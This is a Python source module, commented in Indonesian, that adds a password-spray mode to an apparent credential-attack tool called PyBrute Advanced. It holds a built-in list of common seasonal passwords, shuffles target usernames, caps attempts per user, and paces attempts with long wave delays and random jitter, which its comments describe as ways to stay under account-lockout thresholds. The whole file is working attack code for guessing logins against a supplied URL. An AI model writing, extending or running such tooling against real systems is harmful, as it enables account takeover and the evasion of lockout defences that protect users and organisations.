"""[v2.2] Password Spray mode untuk PyBrute Advanced.

Sesuai riset 2025-2026 (Microsoft DSR: >97% identity attacks = spray/brute;
OWASP Authentication Cheat Sheet): password spray = 1 password dicoba ke
MANY usernames, jeda antar attempt JAUH lebih panjang dari brute biasa,
di bawah lockout threshold.

Ini modul terpisah (tidak mengubah loop utama) — import & panggil dari CLI.
"""
from __future__ import annotations

import random
import time
from typing import Callable, Dict, Iterable, List, Optional

DEFAULT_SPRAY_PASSWORDS = [
    "Summer2026!", "Welcome1", "Password1!", "Spring2026!",
    "Company1!", "P@ssw0rd", "Qwerty123!", "January2026!",
]


def build_spray_batches(passwords: List[str], users: List[str],
                        shuffle_users: bool = True) -> List[List]:
    """Bentuk batch spray: untuk tiap password, iterate SEMUA username.

    Shuffle username (default) supaya ASUMSI BAHWA lockout per-user tidak
    kena berurutan; urutan password selalu lambat→cepat (1 password per wave).
    """
    users_shuffled = list(users)
    if shuffle_users:
        random.shuffle(users_shuffled)
    batches = []
    for pwd in passwords:
        for u in users_shuffled:
            batches.append((u, pwd))
    return batches


def spray_attack(url: str, users: List[str], passwords: List[str],
                 attempt_fn: Callable[[str, str], Dict],
                 wave_delay: float = 1800.0,
                 inter_delay: float = 15.0,
                 max_attempts_per_user: int = 2,
                 stop_on_hit: bool = True,
                 log: Optional[Callable[[str], None]] = None) -> Dict:
    """Jalankan spray dengan kontrol rate ketat.

    attempt_fn(user, password) -> dict {'success': bool, 'status': int, ...}
        (dipanggil oleh pybrute dgn session/login logic miliknya)

    Returns summary: hits, attempts, waves, elapsed.
    """
    log = log or (lambda m: print(m))
    batches = build_spray_batches(passwords, users)
    # Limit per-user: kelompokkan per user; batasi retry
    user_attempt_count: Dict[str, int] = {}
    hits: List[Dict] = []
    attempts = 0
    waves = 0
    t0 = time.time()

    prev_pwd = None
    for i, (user, pwd) in enumerate(batches):
        if user_attempt_count.get(user, 0) >= max_attempts_per_user:
            continue
        # Awal wave baru (password ganti): jeda panjang
        if prev_pwd is not None and pwd != prev_pwd:
            waves += 1
            log(f"[*] Wave {waves + 1} selesai. Jeda {wave_delay/60:.0f} menit (anti-lockout)...")
            time.sleep(wave_delay)
        prev_pwd = pwd

        log(f"[Attempt {i+1}/{len(batches)}] {user} : {pwd}")
        try:
            res = attempt_fn(user, pwd)
        except Exception as e:
            log(f"[-] attempt error: {e}")
            res = {"success": False, "error": str(e)}
        attempts += 1
        user_attempt_count[user] = user_attempt_count.get(user, 0) + 1

        if res.get("success"):
            hits.append({"user": user, "password": pwd, "detail": res})
            log(f"[!!] HIT: {user} : {pwd}")
            if stop_on_hit:
                break

        # Jeda antar attempt dgn jitter (jangan polos)
        jitter = random.uniform(0, inter_delay * 0.3)
        time.sleep(inter_delay + jitter)

    return {
        "hits": hits,
        "attempts": attempts,
        "waves": waves + 1 if batches else 0,
        "elapsed_s": round(time.time() - t0, 1),
        "total_planned": len(batches),
    }
